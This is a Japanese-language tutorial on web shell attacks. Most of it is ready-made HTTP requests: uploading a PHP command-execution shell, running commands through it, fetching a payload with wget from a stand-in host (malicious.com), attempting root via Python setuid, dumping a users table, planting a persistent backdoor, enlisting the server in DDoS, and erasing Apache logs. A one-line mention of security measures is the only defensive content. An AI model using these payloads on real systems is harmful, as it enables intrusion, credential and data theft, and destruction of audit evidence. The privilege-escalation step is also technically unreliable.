# LoL Webシェル攻撃技術の紹介
Webリクエスト本文を利用して侵入したファイルをWebシェル（Web Shell）に変換し、これを活用してさらに悪意のある行為を実行する具体的な攻撃技術は以下の通りです。

---

### **1. Webリクエスト本文によるファイルアップロード**
- 攻撃者はHTTP POSTリクエストを通じて、Webサーバーの特定ディレクトリ（例：`/var/www/html/`）に悪意のあるスクリプトをアップロードします。
- 例：PHPベースのWebサーバーを対象としたWebシェルのアップロード:
```http
POST /upload.php HTTP/1.1
Host: targetsite.com
Content-Type: multipart/form-data; boundary=---WebKitFormBoundary
Content-Length: 1234

---WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
---WebKitFormBoundary--
```

- **結果:** サーバーに`webshell.php`ファイルがアップロードされ、これを通じてリモートコマンド実行が可能になります。

---

### **2. アップロードされたWebシェルの呼び出し**
- アップロードされたWebシェルをHTTP GETリクエストで呼び出し、コマンドを実行します。
- リクエスト例:
```http
GET /webshell.php?cmd=ls HTTP/1.1
Host: targetsite.com
```
- **結果:** サーバーディレクトリ内のファイル一覧が返されます。

---

### **3. 悪意のあるコードの追加ダウンロードと実行**
- Webシェルを利用してリモートURLから悪意のあるコードをダウンロードし、実行します。
- リクエスト例:
```http
GET /webshell.php?cmd=wget+http://malicious.com/payload.sh+-O+/tmp/payload.sh HTTP/1.1
Host: targetsite.com
```
- **結果:** `payload.sh`ファイルがダウンロードされ、これを実行してシステムにさらなる悪意のあるコードをインストールします。

---

### **4. 権限昇格**
- アップロードされたWebシェルを介してサーバーの権限昇格脆弱性を悪用します。
- 例：
```http
GET /webshell.php?cmd=python+-c+"import+os;os.setuid(0);os.system('/bin/bash')" HTTP/1.1
Host: targetsite.com
```
- **結果:** ルート権限を取得し、サーバー制御を掌握します。

---

### **5. データの窃取**
- Webシェルを利用してデータベース資格情報を抽出し、データベースを直接クエリします。
- 例：
```http
GET /webshell.php?cmd=mysql+-u+root+-psecret+-e+"SELECT+*+FROM+users;" HTTP/1.1
Host: targetsite.com
```
- **結果:** データベースからユーザー情報が窃取されます。

---

### **6. バックドアの設置**
- 攻撃者は持続的なアクセスを確保するためにバックドアを設置します。
- 例：
```http
GET /webshell.php?cmd=echo+'<?php+system($_GET[cmd]);?>'+>+/var/www/html/backdoor.php HTTP/1.1
Host: targetsite.com
```
- **結果:** 新たなWebシェル`backdoor.php`が生成されます。

---

### **7. 分散型サービス拒否（DDoS）攻撃の実行**
- Webシェルを使用してターゲットサーバーをボットネットの一部として活用します。
- 例：
```http
GET /webshell.php?cmd=perl+-e+'use+IO::Socket;...;+send_attack();' HTTP/1.1
Host: targetsite.com
```
- **結果:** サーバーがDDoS攻撃に利用されます。

---

### **8. ログの削除**
- 攻撃者は自身の痕跡を削除します。
- 例：
```http
GET /webshell.php?cmd=rm+-rf+/var/log/apache2/* HTTP/1.1
Host: targetsite.com
```
- **結果:** サーバーログが削除され、攻撃追跡が困難になります。

---

これらの技術は、保護されていないファイルアップロード機能、不適切な入力検証、そしてWebサーバーの脆弱性を悪用して実行されます。**適切なセキュリティ対策**によって、これらの攻撃を防ぐことが可能です。
